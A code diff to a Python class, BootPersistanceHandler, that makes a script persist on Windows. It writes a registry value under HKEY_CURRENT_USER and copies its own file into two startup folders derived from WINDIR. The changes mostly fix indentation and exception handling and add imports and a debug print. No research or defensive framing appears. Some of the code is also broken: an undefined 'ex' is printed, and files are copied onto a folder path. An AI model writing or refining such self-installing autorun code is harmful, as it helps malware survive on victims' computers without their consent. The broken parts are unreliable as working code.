@@ -1,3 +1,6 @@
+import platform
+import os
+import os.path
 from shutil import copyfile
 
 class BootPersistanceHandler(object):
@@ -50,18 +53,19 @@ class BootPersistanceHandler(object):
         try:
             winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
             registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-              winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
-              winreg.CloseKey(registry_key)
+            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
+            winreg.CloseKey(registry_key)
 
-              return True
+            return True
         except WindowsError:
               return False
 
     def CheckRegistryKey(location, softwareName, keyName):
-         try:
-             aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
+        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
+
+        try:
              aKey = OpenKey(aReg, location)
-        except ex:
+        except WindowsError:
             print(ex)
             return False
 
@@ -88,12 +92,12 @@ class BootPersistanceHandler(object):
             copyfile(os.path.abspath(__file__), destinationFolder)
 
         # Copy to 2nd directory
-        destinationFolder = r"%s%s" % (
-            WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
+        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
         filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))
 
         if not os.path.isfile(filePath):
             copyfile(os.path.abspath(__file__), destinationFolder)
+
 
     isWindows = (platform.system().lower() == "Windows".lower())
 
@@ -101,3 +105,4 @@ class BootPersistanceHandler(object):
         import winreg
 
         WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']
+        print(WINDOWS_START_UP_FOLDER_PREFIX)
